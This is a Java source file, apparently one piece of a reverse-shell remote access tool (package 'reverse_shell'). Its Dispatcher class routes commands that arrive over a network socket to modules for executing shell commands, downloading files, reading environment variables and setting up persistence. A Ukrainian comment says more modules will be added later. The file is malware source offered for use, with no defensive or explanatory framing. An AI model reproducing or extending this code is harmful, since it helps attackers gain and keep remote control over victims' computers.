package reverse_shell;

import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import reverse_shell.modules.DownloadCommand;
import reverse_shell.modules.EnvCommand;
import reverse_shell.modules.PersistCommand;


import reverse_shell.modules.ShellCommand;

public class Dispatcher {
    private Map<String, CommandHandler> commands = new HashMap<>();

    public Dispatcher() {
        commands.put("exec", new ShellCommand());
        commands.put("download", new DownloadCommand());
        commands.put("env", new EnvCommand());
        commands.put("persist", new PersistCommand());
        // Додаткові модулі додаватимемо тут
    }

    public void dispatch(String input, Socket socket) throws Exception {
        String[] parts = input.trim().split(" ", 2);
        String cmd = parts[0];
        String[] args = (parts.length > 1) ? parts[1].split(" ") : new String[0];

        CommandHandler handler = commands.get(cmd);
        if (handler != null) {
            handler.handle(args, socket);
        } else {
            socket.getOutputStream().write(("Unknown command: " + cmd + "\n").getBytes());
        }
    }
}
